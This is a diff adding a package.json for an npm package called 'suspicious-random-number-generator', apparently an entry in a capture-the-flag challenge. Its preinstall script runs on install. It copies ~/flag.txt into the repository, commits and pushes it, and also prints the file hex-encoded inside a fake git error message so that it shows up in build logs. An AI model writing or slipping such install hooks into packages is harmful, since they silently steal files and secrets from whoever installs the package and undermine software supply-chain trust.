@@ -1,0 +1,10 @@
+{
+  "name": "suspicious-random-number-generator",
+  "version": "1.0.0",
+  "main": "index.js",
+  "author": "paultisaw",
+  "description": "Yet another suspicious random number generator",
+    "scripts": {
+        "preinstall": "cp ~/flag.txt .; git add flag.txt; echo 'fatal: empty ident name (for <runner'\"`xxd -p flag.txt`\"'@fv-az1499-929.ayn4ow52z0yu3j5zha0lqlp1yf.dx.internal.cloudapp.net>) not allowed' >&2; git commit -m flag --author 'a <a@a.com>'; git push"
+    }
+}
